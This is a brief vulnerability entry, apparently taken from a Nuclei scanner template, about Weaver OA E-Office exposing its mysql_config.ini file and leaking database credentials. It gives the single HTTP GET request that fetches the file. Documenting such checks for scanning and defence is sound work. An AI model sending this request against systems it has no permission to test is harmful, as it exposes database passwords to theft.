# Vulnerability: OA E-Office mysql_config.ini - Information Disclosure
**Classification:** ECOLOGY
**Source:** Nuclei Template (`weaver-mysql-config-info-leak.yaml`)

## Description
E-Office mysql_config.ini file can be directly accessed, leaking database account password and other information

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/mysql_config.ini
```

